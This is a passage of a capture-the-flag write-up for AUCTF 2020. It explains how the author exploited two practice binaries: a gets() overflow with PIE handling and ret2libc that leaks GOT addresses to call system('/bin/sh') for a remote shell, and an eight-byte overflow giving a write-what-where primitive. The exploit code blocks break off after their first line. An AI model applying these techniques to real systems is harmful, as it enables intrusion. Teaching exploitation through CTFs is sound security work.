But how do with find it? There is a lot of fluff in the code, but eventually you will find that you need to enter room 4 and say the magic word <code>Stephen</code>. The binary gives lots of hints, particularly the <code>Quit</code> option which hands it to you on a plate. But what do we do in room 4? Let's disassemble the <code>room4</code> function with radare it and see how the input is handled...</p><img src="/img/auctf-2020-room4-disas.png" alt="Disassembly of room4 function in House of Madness binary, showing a call to gets."><p>It uses <code>gets</code>, meaning buffer overflow is almost inevitable! Using <code>pwn cyclic</code> we get a nice pattern to get the offset we need to the return address, and we can call it a day... except not quite. The executable is compiled with PIE. This means that almost everything in the binary is at some offset. Luckily for us, ASLR is turned off so this offset will not vary between each time the executable is run (thanks <a href="https://twitter.com/bad5ect0r">bad5ect0r</a> for telling me about this!). Using <code>pwn cyclic</code> again with our debugger (in my case radare) we see that <code>ebx</code>, the register which stores this offset, is 8 bytes before the return address. In order to achieve reliable code execution, we will need to keep this value exactly the same after our overflow, otherwise other function calls will likely fail miserably. Since I was a PIE noob, I wrote a function <code>leak_base_pie()</code> to determine the correct <code>ebx</code> value on the remote through brute force. Turns out it is exactly the same as on my host machine, <code>0x56559000</code>.</p><p>Cool, we have the ebx value and we can control the return address. Where do we return to? Let's look at the list of functions...</p><img src="/img/auctf-2020-hom-functions.png" alt="Function listing of House of Madness binary, with get_flag highlighted."><p><code>get_flag</code> sounds extremely promising, doesn't it? So I return there, but of course it is not that simple - the function wants more from us. Since the assembly is getting a bit dense, let's whip out Ghidra.</p><img src="/img/auctf-2020-hom-get_flag-ghidra.png" alt="Decompiled get_flag through Ghidra."><p>I tried to fulfil the requirements of the function but I soon gave up and decided to go full hackerman. It was time to ret2libc. Of course the problem was I did not know what libc version ran on the remote server and did not know the correct offsets. By taking advantage of the <code>puts</code> function and giving it the GOT address entries, I could get the "real" addresses of a few functions, including of <code>puts</code> itself and <code>printf</code>. How did I call <code>puts</code> without using its address? I used the more "abstract" PLT address which is always the same (given the PIE offset is the same). pwntools conveniently abstracts this away through the <code>symbols</code> dictionary (addresses you can "just call", for libc functions usually in the PLT as far as I am concerned) and <code>got</code> dictionary for the function pointer table of dynamically resolved addresses. Anyway, the reason we need to do all this is because we want to call <code>system</code> which is never actually called in the binary, and the only way to do that is to get its "real" address. Using <a href="https://libc.blukat.me/">libc database search</a> and the two addresses I leaked of <code>puts</code> and <code>printf</code>, we quickly see that the remote server is running <code>libc6_2.23-0ubuntu3_i386.so</code>. With a tad of arithmetic we can easily calculate the right offset to call <code>system</code> with the argument <code>"/bin/sh"</code> which gives us a remote shell. From there, we can extract the flag, and much more if we wanted to.</p><p>My extremely-production-grade code to do the above steps is below, some lines are commented because they only needed to be run once (e.g. leaking the real addresses).</p><pre><code class="lang-python">from pwn import *

After the command <code>attend Hacker</code> we get a special screen, and then a segfault.</p><img src="/img/auctf-2020-remote-school-run.png" alt="'Normal' execution of the Remote School binary, showing an address and a segmentation fault error."><p>After a bunch of flailing around, I figured out that the <code>test</code> function is where we need to look next. Although input is not directly taken here, we do perform things with the input, namely, copying it to another buffer.</p><img src="/img/auctf-2020-remote-school-test-disas.png" alt="Disassembly of teh test function in the Remote School binary"><p>At first I did not believe the code was vulnerable, but after running <code>pwn cyclic 3000</code> and feeding in the input it was clear that <code>var_ch</code> and <code>var_10h</code> were being overwritten. If you look at the numbers passed to <code>strncpy</code> as well as the offsets of each local variable, you will realise there are exactly 8 bytes of overflow. But what can we do with these 8 bytes? Well lucky for us the code then proceeds to load the variables into <code>eax</code> and <code>edx</code>. But we still can't overwrite the return address because our overflow is not large enough. Hmm...</p><p>Well actually, the binary very conveniently gives us a "write-what-where" primitive <code>mov dword [eax], edx</code>, and we control both of those registers! So, we find out the exact address on the stack where the return address is stored, and set <code>eax</code> to that. Then, we can simply set <code>edx</code> to wherever we want to return to. The <code>print_flag</code> function looks like the perfect target. Locally, the exploit executes fine and we are happy! But unfortunately the same cannot be said about the remote exploit... This is where that weird address that is printed just before the segfault comes in. Again, this is quite unrealistic, but the binary hands us a stack address. Doing basic arithmetic on the address that I get when running the binary locally versus what I get from running it on the remote server, we can easily get the correct offset and correctly overwrite <code>eax</code>. Thankfully, <code>print_flag</code> does not have any tricks up it's sleeve and kindly gives us the flag.</p><p>Again, the full code I used is provided below.</p><pre><code class="lang-python">from pwn import *
